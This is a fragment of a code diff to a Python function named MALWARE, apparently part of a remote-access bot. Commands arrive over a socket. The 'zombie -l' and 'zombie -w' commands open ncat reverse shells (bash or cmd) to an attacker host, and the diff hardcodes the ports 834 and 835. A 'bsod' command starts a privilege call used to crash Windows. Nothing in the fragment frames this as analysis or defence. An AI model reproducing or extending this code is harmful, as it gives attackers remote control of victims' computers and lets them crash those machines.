@@ -110,10 +110,10 @@ def MALWARE():
         MALWARE_RECV = SOCKET.recv(8000).decode()
         
         if MALWARE_RECV == "zombie -l":
-           os.system("ncat {LHOST} {LPORT} -e /bin/bash")
+           os.system("ncat {LHOST} 834 -e /bin/bash")
            
         if MALWARE_RECV == "zombie -w":
-           os.system("ncat {LHOST} {LPORT} -e cmd")
+           os.system("ncat {LHOST} 835 -e cmd")
            
         if MALWARE_RECV == "bsod":
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
